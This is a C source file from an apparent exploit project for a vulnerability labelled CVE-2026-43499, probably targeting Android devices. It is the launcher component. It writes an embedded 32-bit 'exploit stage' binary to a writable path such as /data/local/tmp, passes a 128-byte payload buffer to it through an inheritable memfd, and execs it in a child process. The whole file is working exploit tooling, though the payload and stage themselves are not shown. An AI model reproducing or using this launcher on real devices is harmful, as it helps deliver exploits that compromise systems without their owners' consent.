/*
 * api.c — launcher for the embedded 32-bit CVE-2026-43499 stage.
 *
 * Provides:
 *   int exp_stack_once(uint64_t *buffer);
 *
 * The caller prepares a 16-word (128-byte) payload buffer and this
 * function hands it to the embedded armeabi-v7a binary:
 *
 *   1. install_embedded_exp64() writes the embedded binary to a
 *      guest-writable path (once per process);
 *   2. the buffer is stored in an inheritable memfd (no temp files);
 *   3. the child execve()s the 32-bit stage with the memfd number as
 *      argv[1] and the 64-bit side waits for it to finish.
 *
 * Returns the child's exit status, -1 on setup error, -2 if the
 * embedded binary could not be installed/exec'd.
 */

#include "common.h"

/* Embedded 32-bit stage (see src/exp64_blob.S). */
extern const char embedded_exp64_start[];
extern const char embedded_exp64_end[];

/* Payload size: 16 uint64_t words (see src/exp64/main.c). */
#define EXP_BUFFER_BYTES 128

static const char *exp64_local_path(void) {
  static char path[256];
  if (!path[0]) {
    if (access("/data/local/tmp", W_OK) == 0) {
      snprintf(path, sizeof(path), "/data/local/tmp/cve-exp64");
    } else {
      snprintf(path, sizeof(path), "/tmp/cve-exp64");
    }
  }
  return path;
}

/*
 * install_embedded_exp64 — drop the embedded armeabi-v7a exploit stage
 * to a guest-writable path so exp_stack_once() can execve() it.
 */
int install_embedded_exp64(void) {
  static int installed;
  if (installed) {
    return 1;
  }

  const char *dest = exp64_local_path();
  size_t size = (size_t)(embedded_exp64_end - embedded_exp64_start);
  int fd = open(dest, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
  if (fd < 0) {
    pr_warning("install_embedded_exp64: open %s errno=%d\n", dest, errno);
    return 0;
  }
  size_t off = 0;
  while (off < size) {
    ssize_t n = write(fd, embedded_exp64_start + off, size - off);
    if (n <= 0) {
      pr_warning("install_embedded_exp64: write errno=%d\n", errno);
      close(fd);
      return 0;
    }
    off += (size_t)n;
  }
  close(fd);
  chmod(dest, 0755);
  installed = 1;
  pr_info("install_embedded_exp64: %s (%zu bytes)\n", dest, size);
  return 1;
}

int exp_stack_once(uint64_t *buffer) {
  if (!buffer) {
    pr_warning("exp_stack_once: NULL buffer\n");
    return -1;
  }

  if (!install_embedded_exp64()) {
    pr_warning("exp_stack_once: embedded exp64 install failed errno=%d\n",
               errno);
    return -2;
  }

  /* Inheritable by default (no MFD_CLOEXEC): the exec'd child reads it. */
  int mfd = (int)syscall(__NR_memfd_create, "exp_buf", 0);
  if (mfd < 0) {
    pr_warning("exp_stack_once: memfd_create errno=%d\n", errno);
    return -1;
  }
  ssize_t written = write(mfd, buffer, EXP_BUFFER_BYTES);
  if (written != EXP_BUFFER_BYTES) {
    pr_warning("exp_stack_once: memfd write %zd errno=%d\n",
               written, errno);
    close(mfd);
    return -1;
  }

  pid_t pid = fork();
  if (pid < 0) {
    pr_warning("exp_stack_once: fork errno=%d\n", errno);
    close(mfd);
    return -1;
  }

  if (pid == 0) {
    char fd_arg[16];
    const char *path = exp64_local_path();
    snprintf(fd_arg, sizeof(fd_arg), "%d", mfd);
    execl(path, path, fd_arg, (char *)NULL);
    /* execl only returns on error. */
    pr_warning("exp_stack_once: execl errno=%d\n", errno);
    _exit(127);
  }

  int status;
  while (waitpid(pid, &status, 0) < 0 && errno == EINTR) {
  }
  close(mfd);

  if (WIFEXITED(status)) {
    int exit_code = WEXITSTATUS(status);
    if (exit_code == 127) {
      pr_warning("exp_stack_once: executable not found at %s\n",
                 exp64_local_path());
      return -2;
    }
    return exit_code;
  }

  if (WIFSIGNALED(status)) {
    pr_warning("exp_stack_once: child killed by signal %d\n",
               WTERMSIG(status));
  }
  return -1;
}
